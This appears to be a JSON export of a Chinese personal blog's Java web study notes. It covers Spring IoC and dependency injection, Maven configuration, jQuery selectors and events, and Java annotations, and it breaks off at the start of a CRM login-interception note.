对象 12ApplicationContext app = new ClassPathXmlApplicationContext(&quot;application.xml&quot;);app.getBean(&quot;id&quot;, A.class) ; 在类上使用注解，指定配置 xml 文件 1234567891011@ContextConfiguration(&quot;classpath:application.xml&quot;) // 从项目跟路径搜索 application.xml 文件@RunWith(SpringJUnit4ClassRunner.class) // 运行时注入public Text &#123; @Resource Car car ; @Test public void testMethod() &#123; System.out.println(car); &#125;&#125; Spring 中初始化IOC配置application.xml 调用无参构造方法 1234567 &lt;!-- 通过调用无参构造创建对象 --&gt;&lt;bean id=&quot;myCar&quot; class=&quot;com.ishangu.Car&quot; lazy-init=&quot;true&quot;&gt; &lt;!-- 这里的 name 实际上是调用的setter方法名，转化为 setCarName --&gt; &lt;!-- 该过程是 set 方法实现 DI 依赖注入 --&gt; &lt;property name=&quot;carName&quot; value=&quot;五菱宏光&quot;&gt;&lt;/property&gt; &lt;property name=&quot;carPrice&quot; value=&quot;10000.00&quot;&gt;&lt;/property&gt;&lt;/bean&gt; 调用有参构造方法 12345&lt;!-- 通过调用有参构造创建对象 --&gt;&lt;bean id=&quot;myCar2&quot; class=&quot;com.ishangu.Car&quot; scope=&quot;prototype&quot;&gt; &lt;constructor-arg index=&quot;0&quot; value=&quot;吉普&quot;&gt;&lt;/constructor-arg&gt; &lt;constructor-arg index=&quot;1&quot; value=&quot;50000&quot;&gt;&lt;/constructor-arg&gt;&lt;/bean&gt; 静态工厂实例化 配置所属工厂的权限定名，以及工厂的获取方法即可配置出一个对象。 ==工程类内部一定要提供 static 方法==。 12&lt;!-- 静态工厂实例化 --&gt;&lt;bean id=&quot;a&quot; class=&quot;com.ishangu.AFactory&quot; factory-method=&quot;getA&quot;/&gt; 实例工厂实例化 类似静态工厂，单独配置了工厂的对象。 123&lt;!-- 实例工厂实例化--&gt;&lt;bean id=&quot;bf&quot; class=&quot;com.ishangu.BFactory&quot;/&gt;&lt;bean id=&quot;b&quot; factory-bean=&quot;bf&quot; factory-method=&quot;getB&quot; /&gt; 通过实现 FactoryBean 接口来实例化对象（一般由第三方框架使用）。 使用注解简化 IOC 在 application.xml 中添加搜索路径。 1&lt;context:component-scan base-package=&quot;com.ishangu&quot; /&gt; 在路径包下，所需要注入的类上添加注解 1234ComponentServiceRepositoryController Spring 管理对象的生命周期 通过指定 destory-method、init-method 属性来指定 实例化/销毁 bean 对象后调用的方法。 如果是 多例对象-prototype，那么 Spring 只负责创建，不负责销毁，不会调用 destory-method 指定的方法。 1&lt;bean id=&quot;hello&quot; class=&quot;com.ishangu.Hello&quot; init-method=&quot;init&quot; scope=&quot;singleton&quot; destroy-method=&quot;close&quot; /&gt; 初始化容器 —&gt; 通过反射创建对象 —&gt; 调用初始化方法 —&gt; 关闭容器的时候调用销毁方法。 Spring依赖注入DI方式 构造注入 ==通过调用构造方法==，给 IOC 容器中对象属性赋值。 name 属性指定的是构造函数的形参。 可以注入基本数据类型，和引用数据类型（指定 ref 属性）。 1234&lt;bean id=&quot;mySelf3&quot; class=&quot;com.ishangu.Person&quot;&gt; &lt;constructor-arg name=&quot;name&quot; value=&quot;尹荣基&quot;&gt;&lt;/constructor-arg&gt; &lt;constructor-arg name=&quot;car&quot; ref=&quot;myCar&quot;&gt;&lt;/constructor-arg&gt; &lt;/bean&gt; set 方法注入 name 属性指定的是 set 方法名。 可以注入基本数据类型，和引用数据类型。 1234&lt;bean id=&quot;mySelf&quot; class=&quot;com.ishangu.test.Person&quot;&gt; &lt;property name=&quot;perName&quot; value=&quot;方宁&quot;&gt;&lt;/property&gt; &lt;property name=&quot;perCar&quot; ref=&quot;myCar&quot;&gt;&lt;/property&gt;&lt;/bean&gt; 字段注入（常用） ==使用 @Autowired 注解== 写在字段上：要求字段名与 bean 配置名一致，否则同一类型对象超过两个会报错（可配合 ==@Qualifier== 来指定所需的 bean 对象名）。 123@Autowired@Qualifier(&quot;car1&quot;)Car car ; 写在方法上：对方法的形参进行注入，按照指定类型寻找对象，同类对象不止一个将形参名作为 bean 名进行查找。 12345@Autowiredpublic void setDC(Dog dog1, Cat cat1) &#123; this.dog = dog1 ; this.cat = cat1 ;&#125; * @Autowired 注解的属性，必须从 IOC 容器中获取对象，如果获取不到就会报错。这样子，==如果不想给该类的 @Autowired 属性初始化，就需要指定其 required 属性为 false。== 12@Autowired(required=&quot;false&quot;)Car car ; ==@Resource 注解== 功能与 @Autowired 一致，但是可以指定 name 属性为 bean 对象的 id，不再需要配合 @Qualifier 注解。 匹配规则：==先找注解的 name 属性所指定的 bean==，如果找不到，==再==按照类型进行和 bean 对象进行匹配（和 @Autowired 相反）。 12@Resource(&quot;car1&quot;)Car car ; 接口注入（几乎不用）。 装配方式==装配==，实际上和 DI 注入是一个概念，只不过它所注入的仅仅是==引用数据类型==。 手动 XML 装配 采用 ==set 方法或构造方法的 DI==实现； 直接写在 xml 中. 1234&lt;bean id=&quot;myID&quot; class=&quot;com.ishangu.C&quot;&gt; &lt;constructor-arg name=&quot;A&quot; ref=&quot;a&quot;&gt; &lt;property name=&quot;B&quot; ref=&quot;b&quot;&gt;&lt;/bean&gt; 自动 XML 装配 采用==set 方法或构造方法的 DI==实现； ==配置需要装配的类==。 属性所需要的值，从 IOC 中获取，同字段注入。 直接写 xml 中，添加 bean 的 autowire 属性。 byName：需要 set方法 或者 构造方法，装配的字段名与 ID 一致； byType：需要 set方法 或者 构造方法，装配的字段类型与 class 一致； constructor：需要 构造方法。 123&lt;bean id=&quot;myID&quot; class=&quot;com.ishangu.C&quot; autowire=&quot;byName&quot;&gt;&lt;/bean&gt;&lt;bean id=&quot;myID&quot; class=&quot;com.ishangu.C&quot; autowire=&quot;byType&quot;&gt;&lt;/bean&gt;&lt;bean id=&quot;myID&quot; class=&quot;com.ishangu.C&quot; autowire=&quot;constructor&quot;&gt;&lt;/bean&gt; 注解装配 采用==字段注入的 DI==实现； 对象之间的关系是我们使用 Autowired 或 Resource 注解在代码中维护。","link":"","tags":[{"name":"javaWeb","slug":"javaWeb","permalink":"http://www.fangning.xyz.com/tags/javaWeb/"}]},{"title":"maven","date":"2022-02-09T01:19:30.000Z","path":"2022/02/09/2022.02.09 Maven/","text":"Maven​ Maven 是 apache 旗下的一个项目，这个项目是纯 Java 开发，主要用来管理 Java 项目。 ​ 目前我们使用的第三方 jar 包越来越多，而伴随 jar 包的增加，项目的体积会越来越大，使用 Maven 可以减少项目体积。 ​ 伴随着我们使用的 jar 包越来越多，我们需要上网到处寻找需要的 jar 包及版本，非常麻烦，==而 Maven 提供一个中央仓库，里面有所有常用的 jar 包。== 功能 Maven 可以管理项目的生命周期：编码、编译、测试、运行、打包、部署。 Maven 的依赖管理： jar 包冲突； jar 包之间互相再依赖的关系； jar 包体积过大。 安装 第一步，打开 eclipse-window-preferences-Maven-Installations 进行安装，添加 Maven 解压文件夹路径即可。 第二步，添加 Maven 配置文件 settings.xml 到 Maven-User Settings。 Maven 仓库Maven 的仓库有三种： 中央远程库 私服 本地仓库：就是配置完 Maven 后出现的 D:\\maven_jar 路径。 说明：当我们心目中添加依赖的时候，Maven 会先去本地仓库寻找，在本地仓库找到则直接引用；如果没有找到则去私服寻找；如果私服找不到，则去中央仓库寻找，当中央仓库中找到之后会先下载到本地仓库中，然后进行引用。 Maven 寻找依赖Maven 根据坐标以及版本号来确定需要使用的依赖。 GroupID：公司名称（组织的唯一标识符）； ArifactID：项目唯一标识； Version：版本号。 新建 Maveneclipse 中新建一个 Maven-project 项目。初次新建会从中央远程库下载很多的依赖到本地仓库。 配置阿里云镜像在 settings.xml 文件中，添加 为阿里云镜像。 12345&lt;mirror&gt; &lt;id&gt;nexus-aliyun&lt;/id&gt; &lt;mirrorOf&gt;central&lt;/mirrorOf&gt; &lt;name&gt;Nexus aliyun&lt;/name&gt; &lt;url&gt;http://maven.aliyun.com/nexus/content/groups/public&lt;/url&gt;url&gt;&lt;/mirror&gt; 配置 Maven 默认 JDK在 setting 中添加 12345678910111213&lt;profile&gt; &lt;id&gt;jdk1.8&lt;/id&gt; &lt;activation&gt; &lt;activeByDefault&gt;true&lt;/activeByDefault&gt; &lt;jdk&gt;1.8&lt;/jdk&gt; &lt;/activation&gt; &lt;properties&gt; &lt;maven.compiler.source&gt;1.8&lt;/maven.compiler.source&gt; &lt;maven.compiler.target&gt;1.8&lt;/maven.compiler.target&gt; &lt;maven.compiler.compilerVersion&gt;1.8&lt;/maven.compiler.compilerVersion&gt; &lt;/properties&gt; &lt;/profile&gt; 右击 Maven项目，选择 Maven-updateProject 刷新 JDK。","link":"","tags":[{"name":"javaWeb","slug":"javaWeb","permalink":"http://www.fangning.xyz.com/tags/javaWeb/"}]},{"title":"Jquery","date":"2022-01-21T15:37:00.000Z","path":"2022/01/21/2022.1.21 Jquery/","text":"jQuery简介jQuery优点​ jQuery的字面意思其实就是JavaScript和查询（Query），即用于辅助开发JavaScript的库。jQuery是继prototype之后的又一个优质的Javascript库，属于开源编程语言。 ​ jQuery使用户可以更加方便地处理HTML（标准通用标记语言下的一个应用）、events、实现动画效果，而且方便地为网站提供AJAX交互。jQuery还有一个比较大的优势是，它的文档说明很全，而且各种应用也说得很详尽，同时还有很多成熟的插件可供选择。jQuery可以使用户的html页面保持代码和html的内容分离，也就是说，不需要再在html里面插入一堆js来调用命令了，只需要定义id即可。 jQuery的缺点：1、不能向后兼容。每一个新版本不能兼容早期的版本。 2、插件兼容性不是太好，与上一点类似。 3、在同一页面上使用多个插件时，很容易碰到冲突现象，尤其是这些插件依赖相同事件或selector时最为明显。 4、在大型框架中，jQuery核心代码库对动画和特效的支持相对较差。但是实际上这不是一个问题。目前在这方面有一个单独的jQuery UI项目和众多插件来弥补此点。 jQuery安装 网页中添加 jQuery可以通过多种方法在网页中添加 jQuery。 您可以使用以下方法： 从 jquery.com 下载 jQuery 库 从 CDN 中载入 jQuery, 如从 Google 中加载 jQuery 下载 jQuery有两个版本的 jQuery 可供下载： Production version - 用于实际的网站中，已被精简和压缩。 Development version - 用于测试和开发（未压缩，是可读的代码） 以上两个版本都可以从 jquery.com 中下载。 jQuery 库是一个 JavaScript 文件，您可以使用 HTML 的 标签引用它： 123&lt;head&gt;&lt;script src=&quot;jquery-1.10.2.min.js&quot;&gt;&lt;/script&gt;&lt;/head&gt; jQuery 使用版本我们可以在浏览器的 Console 窗口中使用 $.fn.jquery 命令查看当前 jQuery 使用的版本： 使用的版本： jQuery语法简单函数取值函数（选择器）：$( )jQuery 语法是为 HTML 元素的选取编制的，可以对元素执行某些操作。 基础语法是：*$(selector).action()* 美元符号定义 jQuery 选择符（selector）“查询”和“查找” HTML 元素 jQuery 的 action() 执行对元素的操作 隐藏函数：hide（）123456789101112&lt;script type=&quot;text/javascript&quot; src=&quot;/jquery/jquery.js&quot;&gt;&lt;/script&gt;&lt;script type=&quot;text/javascript&quot;&gt;$(document).ready(function()&#123; //这是为了防止文档在完全加载（就绪）之前运行 jQuery 代码 $(&quot;button&quot;).click(function()&#123; //选择为button类型的对象，设定其点击事件 $(this).hide(); //设置点击事件为“隐藏当前对象” $(&quot;#id1&quot;).hide(); //设置点击事件为“隐藏id为“id1”的对象” $(&quot;p&quot;).hide(); //设置点击事件为“隐藏&lt;p&gt;标签的对象” $(&quot;.class1&quot;).hide(); //设置点击事件为“隐藏class为“class1”的对象”&#125;);&#125;);&lt;/script&gt;&lt;/head&gt; 选择器详解（$( )）$( )选择器允许您对元素组或单个元素进行操作。 jQuery 元素选择器jQuery 使用 CSS 选择器来选取 HTML 元素。 $(“p”) 选取 元素。 $(“p.intro”) 选取所有 class=”intro” 的 元素。 $(“p#demo”) 选取所有 id=”demo” 的 元素。 jQuery 属性选择器jQuery 使用 XPath 表达式来选择带有给定属性的元素。 $(“[href]”) 选取所有带有 href 属性的元素。 $(“[href=’#’]”) 选取所有带有 href 值等于 “#” 的元素。 $(“[href!=’#’]”) 选取所有带有 href 值不等于 “#” 的元素。 $(“[href$=’.jpg’]”) 选取所有 href 值以 “.jpg” 结尾的元素。 jQuery CSS 选择器可用于改变 HTML 元素的 CSS 属性。 下面的例子把所有 p 元素的背景颜色更改为红色： 1$(&quot;p&quot;).css(&quot;background-color&quot;,&quot;red&quot;); 语法 描述 $(this) 当前 HTML 元素 $(“p”) 所有 元素 $(“p.intro”) 所有 class=”intro” 的 元素 $(“.intro”) 所有 class=”intro” 的元素 $(“#intro”) id=”intro” 的元素 $(“ul li:first”) 每个 的第一个 元素 $(“[href$=’.jpg’]”) 所有带有以 “.jpg” 结尾的属性值的 href 属性 $(“div#intro .head”) id=”intro” 的 元素中的所有 class=”head” 的元素 jQuery HTMljQuery 拥有可操作 HTML 元素和属性的强大方法。 jQuery DOM 操作jQuery 中非常重要的部分，就是操作 DOM 的能力。 jQuery 提供一系列与 DOM 相关的方法，这使访问和操作元素和属性变得很容易。 提示：DOM = Document Object Model（文档对象模型） DOM 定义访问 HTML 和 XML 文档的标准： “W3C 文档对象模型独立于平台和语言的界面，允许程序和脚本动态访问和更新文档的内容、结构以及样式。” 获得内容 - text()、html() 以及 val()三个简单实用的用于 DOM 操作的 jQuery 方法： text() - 设置或返回所选元素的文本内容 html() - 设置或返回所选元素的内容（包括 HTML 标记） val() - 设置或返回表单字段的值 下面的例子演示如何通过 jQuery text() 和 html() 方法来获得内容： 实例123456$(&quot;#btn1&quot;).click(function()&#123; alert(&quot;Text: &quot; + $(&quot;#test&quot;).text());&#125;);$(&quot;#btn2&quot;).click(function()&#123; alert(&quot;HTML: &quot; + $(&quot;#test&quot;).html());&#125;); 下面的例子演示如何通过 jQuery val() 方法获得输入字段的值： 实例123$(&quot;#btn1&quot;).click(function()&#123; alert(&quot;Value: &quot; + $(&quot;#test&quot;).val());&#125;); 获取属性 - attr()jQuery attr() 方法用于获取属性值。 下面的例子演示如何获得链接中 href 属性的值： 实例123$(&quot;button&quot;).click(function()&#123; alert($(&quot;#w3s&quot;).attr(&quot;href&quot;));&#125;); text()、html() 以及 val() 的回调函数上面的三个 jQuery 方法：text()、html() 以及 val()，同样拥有回调函数。回调函数由两个参数：被选元素列表中当前元素的下标，以及原始（旧的）值。然后以函数新值返回您希望使用的字符串。 下面的例子演示带有回调函数的 text() 和 html()： 实例12345678910111213$(&quot;#btn1&quot;).click(function()&#123; $(&quot;#test1&quot;).text(function(i,origText)&#123; return &quot;Old text: &quot; + origText + &quot; New text: Hello world! (index: &quot; + i + &quot;)&quot;; &#125;);&#125;);$(&quot;#btn2&quot;).click(function()&#123; $(&quot;#test2&quot;).html(function(i,origText)&#123; return &quot;Old html: &quot; + origText + &quot; New html: Hello &lt;b&gt;world!&lt;&#x2F;b&gt; (index: &quot; + i + &quot;)&quot;; &#125;);&#125;); 设置属性 - attr()jQuery attr() 方法也用于设置/改变属性值。 下面的例子演示如何改变（设置）链接中 href 属性的值： 实例123$(&quot;button&quot;).click(function()&#123; $(&quot;#w3s&quot;).attr(&quot;href&quot;,&quot;http:&#x2F;&#x2F;www.w3school.com.cn&#x2F;jquery&quot;);&#125;); attr() 方法也允许您同时设置多个属性。 下面的例子演示如何同时设置 href 和 title 属性： 实例123456$(&quot;button&quot;).click(function()&#123; $(&quot;#w3s&quot;).attr(&#123; &quot;href&quot; : &quot;http:&#x2F;&#x2F;www.w3school.com.cn&#x2F;jquery&quot;, &quot;title&quot; : &quot;W3School jQuery Tutorial&quot; &#125;);&#125;); attr() 的回调函数jQuery 方法 attr()，也提供回调函数。回调函数由两个参数：被选元素列表中当前元素的下标，以及原始（旧的）值。然后以函数新值返回您希望使用的字符串。 下面的例子演示带有回调函数的 attr() 方法： 实例12345$(&quot;button&quot;).click(function()&#123; $(&quot;#w3s&quot;).attr(&quot;href&quot;, function(i,origValue)&#123; return origValue + &quot;&#x2F;jquery&quot;; &#125;);&#125;); 添加新的 HTML 内容我们将学习用于添加新内容的四个 jQuery 方法： append() - 在被选元素的结尾插入内容 prepend() - 在被选元素的开头插入内容 after() - 在被选元素之后插入内容 before() - 在被选元素之前插入内容 jQuery append() 方法jQuery append() 方法在被选元素的结尾插入内容。 实例1$(&quot;p&quot;).append(&quot;Some appended text.&quot;); jQuery prepend() 方法jQuery prepend() 方法在被选元素的开头插入内容。 实例1$(&quot;p&quot;).prepend(&quot;Some prepended text.&quot;); 通过 append() 和 prepend() 方法添加若干新元素在上面的例子中，我们只在被选元素的开头/结尾插入文本/HTML。 不过，append() 和 prepend() 方法能够通过参数接收无限数量的新元素。可以通过 jQuery 来生成文本/HTML（就像上面的例子那样），或者通过 JavaScript 代码和 DOM 元素。 在下面的例子中，我们创建若干个新元素。这些元素可以通过 text/HTML、jQuery 或者 JavaScript/DOM 来创建。然后我们通过 append() 方法把这些新元素追加到文本中（对 prepend() 同样有效）： 实例12345678function appendText()&#123;var txt1&#x3D;&quot;&lt;p&gt;Text.&lt;&#x2F;p&gt;&quot;; &#x2F;&#x2F; 以 HTML 创建新元素var txt2&#x3D;$(&quot;&lt;p&gt;&lt;&#x2F;p&gt;&quot;).text(&quot;Text.&quot;); &#x2F;&#x2F; 以 jQuery 创建新元素var txt3&#x3D;document.createElement(&quot;p&quot;); &#x2F;&#x2F; 以 DOM 创建新元素txt3.innerHTML&#x3D;&quot;Text.&quot;;$(&quot;p&quot;).append(txt1,txt2,txt3); &#x2F;&#x2F; 追加新元素&#125; jQuery after() 和 before() 方法jQuery after() 方法在被选元素之后插入内容。 jQuery before() 方法在被选元素之前插入内容。 实例123$(&quot;img&quot;).after(&quot;Some text after&quot;);$(&quot;img&quot;).before(&quot;Some text before&quot;); 通过 after() 和 before() 方法添加若干新元素after() 和 before() 方法能够通过参数接收无限数量的新元素。可以通过 text/HTML、jQuery 或者 JavaScript/DOM 来创建新元素。 在下面的例子中，我们创建若干新元素。这些元素可以通过 text/HTML、jQuery 或者 JavaScript/DOM 来创建。然后我们通过 after() 方法把这些新元素插到文本中（对 before() 同样有效）： 实例12345678function afterText()&#123;var txt1&#x3D;&quot;&lt;b&gt;I &lt;&#x2F;b&gt;&quot;; &#x2F;&#x2F; 以 HTML 创建新元素var txt2&#x3D;$(&quot;&lt;i&gt;&lt;&#x2F;i&gt;&quot;).text(&quot;love &quot;); &#x2F;&#x2F; 通过 jQuery 创建新元素var txt3&#x3D;document.createElement(&quot;big&quot;); &#x2F;&#x2F; 通过 DOM 创建新元素txt3.innerHTML&#x3D;&quot;jQuery!&quot;;$(&quot;img&quot;).after(txt1,txt2,txt3); &#x2F;&#x2F; 在 img 之后插入新元素&#125; 删除元素/内容如需删除元素和内容，一般可使用以下两个 jQuery 方法： remove() - 删除被选元素（及其子元素） empty() - 从被选元素中删除子元素 jQuery remove() 方法jQuery remove() 方法删除被选元素及其子元素。 实例1$(&quot;#div1&quot;).remove(); jQuery empty() 方法jQuery empty() 方法删除被选元素的子元素。 实例1$(&quot;#div1&quot;).empty(); 过滤被删除的元素jQuery remove() 方法也可接受一个参数，允许您对被删元素进行过滤。 该参数可以是任何 jQuery 选择器的语法。 下面的例子删除 class=”italic” 的所有 元素： 实例1$(&quot;p&quot;).remove(&quot;.italic&quot;); jQuery事件jQuery 是为事件处理特别设计的。 jQuery 事件函数jQuery 事件处理方法是 jQuery 中的核心函数。 事件处理程序指的是当 HTML 中发生某些事件时所调用的方法。术语由事件“触发”（或“激发”）经常会被使用。 通常会把 jQuery 代码放到 部分的事件处理方法中： 单独文件中的函数如果您的网站包含许多页面，并且您希望您的 jQuery 函数易于维护，那么请把您的 jQuery 函数放到独立的 .js 文件中。 当我们在教程中演示 jQuery 时，会将函数直接添加到 部分中。不过，把它们放到一个单独的文件中会更好，就像这样（通过 src 属性来引用文件）： 1234&lt;head&gt;&lt;script type&#x3D;&quot;text&#x2F;javascript&quot; src&#x3D;&quot;jquery.js&quot;&gt;&lt;&#x2F;script&gt;&lt;script type&#x3D;&quot;text&#x2F;javascript&quot; src&#x3D;&quot;my_jquery_functions.js&quot;&gt;&lt;&#x2F;script&gt;&lt;&#x2F;head&gt; jQuery 名称冲突jQuery 使用 $ 符号作为 jQuery 的简介方式。 某些其他 JavaScript 库中的函数（比如 Prototype）同样使用 $ 符号。 jQuery 使用名为 noConflict() 的方法来解决该问题。 1var jq=jQuery.noConflict() 帮助您使用自己的名称（比如 jq）来代替 $ 符号。 结论由于 jQuery 是为处理 HTML 事件而特别设计的，那么当您遵循以下原则时，您的代码会更恰当且更易维护： 把所有 jQuery 代码置于事件处理函数中 把所有事件处理函数置于文档就绪事件处理器中 把 jQuery 代码置于单独的 .js 文件中 如果存在名称冲突，则重命名 jQuery 库 jQuery 事件下面是 jQuery 中事件方法的一些例子： Event 函数 绑定函数至 $(document).ready(function) 将函数绑定到文档的就绪事件（当文档完成加载时） $(selector).click(function) 触发或将函数绑定到被选元素的点击事件 $(selector).dblclick(function) 触发或将函数绑定到被选元素的双击事件 $(selector).focus(function) 触发或将函数绑定到被选元素的获得焦点事件 $(selector).mouseover(function) 触发或将函数绑定到被选元素的鼠标悬停事件 如需完整的参考手册，请访问我们的 jQuery 事件参考手册。 方法 描述 bind() 向匹配元素附加一个或更多事件处理器 blur() 触发、或将函数绑定到指定元素的 blur 事件 change() 触发、或将函数绑定到指定元素的 change 事件 click() 触发、或将函数绑定到指定元素的 click 事件 dblclick() 触发、或将函数绑定到指定元素的 double click 事件 delegate() 向匹配元素的当前或未来的子元素附加一个或多个事件处理器 die() 移除所有通过 live() 函数添加的事件处理程序。 error() 触发、或将函数绑定到指定元素的 error 事件 event.isDefaultPrevented() 返回 event 对象上是否调用了 event.preventDefault()。 event.pageX 相对于文档左边缘的鼠标位置。 event.pageY 相对于文档上边缘的鼠标位置。 event.preventDefault() 阻止事件的默认动作。 event.result 包含由被指定事件触发的事件处理器返回的最后一个值。 event.target 触发该事件的 DOM 元素。 event.timeStamp 该属性返回从 1970 年 1 月 1 日到事件发生时的毫秒数。 event.type 描述事件的类型。 event.which 指示按了哪个键或按钮。 focus() 触发、或将函数绑定到指定元素的 focus 事件 keydown() 触发、或将函数绑定到指定元素的 key down 事件 keypress() 触发、或将函数绑定到指定元素的 key press 事件 keyup() 触发、或将函数绑定到指定元素的 key up 事件 live() 为当前或未来的匹配元素添加一个或多个事件处理器 load() 触发、或将函数绑定到指定元素的 load 事件 mousedown() 触发、或将函数绑定到指定元素的 mouse down 事件 mouseenter() 触发、或将函数绑定到指定元素的 mouse enter 事件 mouseleave() 触发、或将函数绑定到指定元素的 mouse leave 事件 mousemove() 触发、或将函数绑定到指定元素的 mouse move 事件 mouseout() 触发、或将函数绑定到指定元素的 mouse out 事件 mouseover() 触发、或将函数绑定到指定元素的 mouse over 事件 mouseup() 触发、或将函数绑定到指定元素的 mouse up 事件 one() 向匹配元素添加事件处理器。每个元素只能触发一次该处理器。 ready() 文档就绪事件（当 HTML 文档就绪可用时） resize() 触发、或将函数绑定到指定元素的 resize 事件 scroll() 触发、或将函数绑定到指定元素的 scroll 事件 select() 触发、或将函数绑定到指定元素的 select 事件 submit() 触发、或将函数绑定到指定元素的 submit 事件 toggle() 绑定两个或多个事件处理器函数，当发生轮流的 click 事件时执行。 trigger() 所有匹配元素的指定事件 triggerHandler() 第一个被匹配元素的指定事件 unbind() 从匹配元素移除一个被添加的事件处理器 undelegate() 从匹配元素移除一个被添加的事件处理器，现在或将来 unload() 触发、或将函数绑定到指定元素的 unload 事件 jQuery 遍历什么是遍历？jQuery 遍历，意为“移动”，用于根据其相对于其他元素的关系来“查找”（或选取）HTML 元素。以某项选择开始，并沿着这个选择移动，直到抵达您期望的元素为止。 下图展示了一个家族树。通过 jQuery 遍历，您能够从被选（当前的）元素开始，轻松地在家族树中向上移动（祖先），向下移动（子孙），水平移动（同胞）。这种移动被称为对 DOM 进行遍历。 图示解释： 元素是 的父元素，同时是其中所有内容的祖先。 元素是 元素的父元素，同时是 的子元素 左边的 元素是 的父元素， 的子元素，同时是 的后代。 元素是 的子元素，同时是 和 的后代。 两个 元素是同胞（拥有相同的父元素）。 右边的 元素是 的父元素， 的子元素，同时是 的后代。 元素是右边的 的子元素，同时是 和 的后代。 提示：祖先是父、祖父、曾祖父等等。后代是子、孙、曾孙等等。同胞拥有相同的父。","link":"","tags":[{"name":"javaWeb","slug":"javaWeb","permalink":"http://www.fangning.xyz.com/tags/javaWeb/"}]},{"title":"注解","date":"2022-01-20T07:07:30.000Z","path":"2022/01/20/2022.1.20 注解/","text":"注解定义 通过 @interface 关键字进行定义 123public @interface TestAnnotation &#123; &#125; 创建和接口类似，仅仅添加了一个 @ 符号；==注解，就相当于标签==。 应用 注解类似于标签，那么使用方法就是 —— 把标签贴到物体上。实际上，就是可以把注解添加到类、属性、方法上。 12345678910@TestAnnotationpublic class Test &#123; @AutoWire private String name ; @myMethod public void put() &#123; &#125;&#125; 不过，注解想要使用，还得在定义的时候使用==元注解==。 元注解 元注解 —— 一种基本注解，可以注解到其它注解上面（可以注解到注解上的注解）。 元注解分以下几类 ==@Retention== retention 保留期，当 @Retention 应用到一个注解上的时候，解释说明了这个注解的存活时间。 取值： RetentionPolicy.SOURCE：注解只在源码阶段保留，编译时将呗丢弃忽略。 RetentionPolicy.CLASS：保留到编译进行的时候，不会被加载到 JVM 中。 ==RetentionPolicy.RUNTIME==：保留到程序运行的时候，会被加载进入到 JVM 中，所以在程序运行时可以获取到他们。 1234@Retention(RetentionPolicy.RUNTIME)public @interface TestAnnotation &#123; &#125; @==Target== target 目标，@Target 指定了注解所应用的场景（类，方法，属性等…） 取值 ElementType.ANNOTATION_TYPE：可以注解到注解上。 ElementType.CONSTRUCTOR：可以给构造方法进行注解 ==ElementType.FIELD==：可以给属性进行注解 ElementType.LOCAL_VARIABLE：可以给局部变量进行注 ==ElementType.METHOD==：可以给方法进行注解 ElementType.PACKAGE：可以给一个包进行注解 ElementType.PARAMETER：可以给一个方法内的参数进行注解 ==ElementType.TYPE==：可以给一个类型进行注解，比如类、接口、枚举 @Documented 注解和文档有关，可以将注解中的元素包含到 Javadoc 中去。 @Inherited inherited 继承，被该类型的注解标记过的类，其子类也会自动被标记。 @Repeatable repeatable 可重复，我们可能给一个类，贴上多张同类型的标签，但是这些标签上写的内容不一样。比如：一个人可以是程序员、经理、画家。 Repeatable详解 1234567891011121314151617181920212223@Repeatable(Persons.class)@interface Person &#123; String role() default &quot;&quot; ;&#125;@interface Persons &#123; Person[] value() default &#123;&#125; ;&#125;// 不用 Repeatable 写法@Persons(&#123; @Person(role=&quot;coder&quot;) , @Person(role=&quot;mgr&quot;) , @Person(role=&quot;artist&quot;)&#125;)// 使用 Repeatable 后，自动转为 Persons 注解@Person(role=&quot;coder&quot;)@Person(role=&quot;mgr&quot;)@Person(role=&quot;artist&quot;)public class Human &#123; &#125; Repeatable注解 指定了存放 Person注解 的容器为 Persons注解。 注解属性 注解只有属性（成员变量），没有方法。 属性声明：无形参的方法，==方法返回值作为属性类型，方法名作为属性名==。 属性默认：使用 ==default== 关键字进行指定。 123456@Target(ElementType.TYPE)@Retention(RetentionPolicy.RUNTIME)public @interface TestAnnotation &#123; int id() default -1; String msg() default &quot;&quot;;&#125; 使用时，在注解括号内对注解属性进行赋值，不赋值采用默认值。 12345678910@TestAnnotation(id=3, msg=&quot;this is a annotation test!&quot;)public class Test &#123; &#125;// 或者@TestAnnotation()public class Test &#123; &#125; ==仅一个属性== 如果注解只有一个名为 value 的属性。那么在注解时可以直接写到括号内。 12345678910@Target(ElementType.TYPE)@Retention(RetentionPolicy.RUNTIME)@interface TestAnnotation &#123; String value() default &quot;&quot; ;&#125;@TestAnnotation(&quot;hello&quot;)public class Test &#123; &#125; ==无属性==：如果注解内无属性，那么使用时无需加括号（）。 java内置注解 @Deprecated：表示过期的类，方法，成员变量。java 更新过程中会淘汰掉一些不合适的代码，但是又不能直接删除，这个时候就会将其标记为 Deprecated ，来提醒大家不要使用；==有时使用此类方法，会永远返回 NULL==。 @Override：覆写，必须正确覆写父类中的对应方法，否则会报错。 @SuppressWarnings：压制警告。 @SafeVarargs：参数安全类型注解。它的目的是提醒开发者不要用参数做一些不安全的操作,它的存在会阻止编译器产生 unchecked 这样的警告。它是在 Java 1.7 的版本中加入的。 1234567@SafeVarargs // 不是很安全 static void m(List&lt;String&gt;... stringLists) &#123; Object[] array = stringLists; List&lt;Integer&gt; tmpList = Arrays.asList(42); array[0] = tmpList; // 此时array不再是 String[] String s = stringLists[0].get(0); // Integer 变 String 类型错误&#125; 上面代码，编译会通过，但是有隐藏的BUG；运行会抛异常。 @FunctionalInterface：函数式接口注解。==函数式接口：就是一个具有一个方法的普通接口。== 适用于函数式编程。 1234@FunctionalInterfacepublic interface Runnable &#123; void run() ;&#125; 函数式接口可以很容易转化为 Lambda 表达式。 Class类与注解相关 api是否应用了某注解 ==boolean isAnnotationPresent(某注解的Class)== 获取注解 ==getAnnotation(某注解的Class)==：返回注解在该类型上的某一类注解。 ==getAnnotations（）==：返回该类型上的所有注解。 ==getAnnotationByType(某注解的Class)== 。 访问注解属性使用直接访问符 . 来访问注解的属性方法。 12345678910@AnnotationTestpublic class Test &#123; public static void main(String[] args) &#123; Class c = Test.Class; if(c.isAnnotationPresent(AnnotationTest.class)) &#123; AnnotationTest annotation = c.getAnnotation(TestAnnotation.class) ; System.out.println(annotation.value()) ; &#125; &#125;&#125;","link":"","tags":[{"name":"javaWeb","slug":"javaWeb","permalink":"http://www.fangning.xyz.com/tags/javaWeb/"}]},{"title":"CRM项目","date":"2022-01-12T01:42:30.000Z","path":"2022/01/12/2022.1.12 CRM项目改进/","text":"访问拦截未登录访问 jsp 页面 方法一：每一个 jsp 前面加入拦截代码：从 session 域中取登陆信息，如果为 NULL 则重定向到登陆界面。==该方法，虽然可以实现，但是需要在前端写java逻辑代码，没有实现前后端分离==。 123&lt;c:if test=&quot;$&#123;empty 